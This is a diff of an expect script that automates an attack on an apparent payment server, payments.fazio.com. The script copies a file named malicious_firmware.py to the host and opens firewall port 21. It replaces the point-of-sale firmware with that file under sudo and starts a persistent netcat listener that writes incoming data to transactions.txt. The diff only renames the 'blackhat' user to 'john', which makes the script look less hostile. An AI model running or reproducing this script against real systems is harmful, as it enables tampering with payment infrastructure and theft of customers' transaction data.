@@ -1,6 +1,6 @@
 #!/usr/bin/expect -f
 
-spawn scp /home/ubuntu/malicious_firmware.py blackhat@payments.fazio.com:/home/blackhat/malicious_firmware.py
+spawn scp /home/ubuntu/malicious_firmware.py john@payments.fazio.com:/home/john/malicious_firmware.py
 
 expect {
   "key fingerprint" {send "yes\r"; exp_continue}
@@ -13,7 +13,7 @@ send "exit\r"
 
 wait 1
 
-spawn ssh blackhat@payments.fazio.com
+spawn ssh john@payments.fazio.com
 
 expect {
   "key fingerprint" {send "yes\r"; exp_continue}
@@ -27,10 +27,10 @@ expect "$ "
 send "sudo ufw allow 21\r"
 
 expect "$ "
-send "sudo mv /home/blackhat/malicious_firmware.py /home/ubuntu/payment-server/pos_firmware.py\r"
+send "sudo mv /home/john/malicious_firmware.py /home/ubuntu/payment-server/pos_firmware.py\r"
 
 expect "$ "
-send "sudo nc -k -l 6666 >/home/blackhat/transactions.txt 2>&1 &\r"
+send "sudo nc -k -l 6666 >/home/john/transactions.txt 2>&1 &\r"
 
 expect "$ "
 send "exit\r"
